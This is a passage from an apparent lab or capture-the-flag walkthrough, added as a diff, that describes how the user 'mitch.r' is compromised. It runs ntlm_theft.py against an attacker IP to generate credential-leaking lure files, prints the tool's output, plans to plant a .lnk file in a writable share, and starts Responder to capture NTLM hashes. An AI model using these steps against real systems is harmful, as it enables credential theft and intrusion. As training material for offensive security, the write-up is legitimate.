@@ -281,3 +281,43 @@ And also in the dev$ share
 
 It also says it allows any kind of files are allowed
 
+# Compromising `mitch.r`
+
+```python
+python3 ntlm_theft.py -g all -s 10.200.75.240 -f meeting
+/home/kali/hsm/ShadowGate2/ntlm_theft/ntlm_theft.py:168: SyntaxWarning: invalid escape sequence '\l'
+  location.href = 'ms-word:ofe|u|\\''' + server + '''\leak\leak.docx';
+Created: meeting/meeting.scf (BROWSE TO FOLDER)
+Created: meeting/meeting-(url).url (BROWSE TO FOLDER)
+Created: meeting/meeting-(icon).url (BROWSE TO FOLDER)
+Created: meeting/meeting.lnk (BROWSE TO FOLDER)
+Created: meeting/meeting.rtf (OPEN)
+Created: meeting/meeting-(stylesheet).xml (OPEN)
+Created: meeting/meeting-(fulldocx).xml (OPEN)
+Created: meeting/meeting.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
+Created: meeting/meeting-(handler).htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
+Created: meeting/meeting-(includepicture).docx (OPEN)
+Created: meeting/meeting-(remotetemplate).docx (OPEN)
+Created: meeting/meeting-(frameset).docx (OPEN)
+Created: meeting/meeting-(externalcell).xlsx (OPEN)
+Created: meeting/meeting.wax (OPEN)
+Created: meeting/meeting.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)
+Created: meeting/meeting.asx (OPEN)
+Created: meeting/meeting.jnlp (OPEN)
+Created: meeting/meeting.application (DOWNLOAD AND OPEN)
+Created: meeting/meeting.pdf (OPEN AND ALLOW)
+Created: meeting/zoom-attack-instructions.txt (PASTE TO CHAT)
+Created: meeting/meeting.library-ms (BROWSE TO FOLDER)
+Created: meeting/Autorun.inf (BROWSE TO FOLDER)
+Created: meeting/desktop.ini (BROWSE TO FOLDER)
+Created: meeting/meeting.theme (THEME TO INSTALL
+Generation Complete.
+```
+
+So since the files get uploaded the that share, ill make a .lnk file
+
+```python
+sudo responder -I tun0
+```
+
+Then ill start
